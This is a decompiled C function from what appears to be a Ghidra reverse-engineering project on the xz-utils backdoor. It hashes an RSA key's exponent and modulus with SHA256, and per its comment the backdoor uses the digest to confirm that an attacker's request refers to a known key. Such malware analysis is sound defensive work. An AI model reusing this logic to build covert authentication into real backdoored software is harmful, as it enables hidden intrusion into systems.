// /home/kali/xzre-ghidra/xzregh/107510_rsa_key_hash.c
// Function: rsa_key_hash @ 0x107510
// Calling convention: unknown
// Prototype: undefined rsa_key_hash(void)


/*
 * AutoDoc: Serialises the RSA exponent and modulus and hashes them with SHA256 using the resolved imports. The monitor hooks rely on that digest to confirm that an attacker request refers to a known host key before acting.
 */
#include "xzre_types.h"


undefined8 rsa_key_hash(long param_1,undefined8 param_2,undefined8 param_3,long param_4)

{
  ulong uVar1;
  int iVar2;
  undefined8 uVar3;
  long lVar4;
  undefined1 *puVar5;
  ulong buf;
  long written;
  long expSize;
  undefined8 n [2];
  undefined1 e [4098];
  
  puVar5 = e;
  for (lVar4 = 0xffa; lVar4 != 0; lVar4 = lVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  n[0] = 0;
  n[1] = 0;
  buf = 0;
  if (((param_4 != 0) && (param_1 != 0)) && (*(code **)(param_4 + 0x60) != (code *)0x0)) {
    written = 0;
    expSize = 0;
    (**(code **)(param_4 + 0x60))(param_1,&expSize,&written,0);
    if ((written != 0) && (expSize != 0)) {
      iVar2 = bignum_serialize(n,0x100a,&buf,written,param_4);
      uVar1 = buf;
      if (((iVar2 != 0) &&
          ((buf < 0x100a &&
           (iVar2 = bignum_serialize((long)n + buf,0x100a - buf,&buf,expSize,param_4), iVar2 != 0)))
          ) && (uVar1 + buf < 0x100b)) {
        uVar3 = sha256(n,uVar1 + buf,param_2,param_3,param_4);
        return uVar3;
      }
    }
  }
  return 0;
}

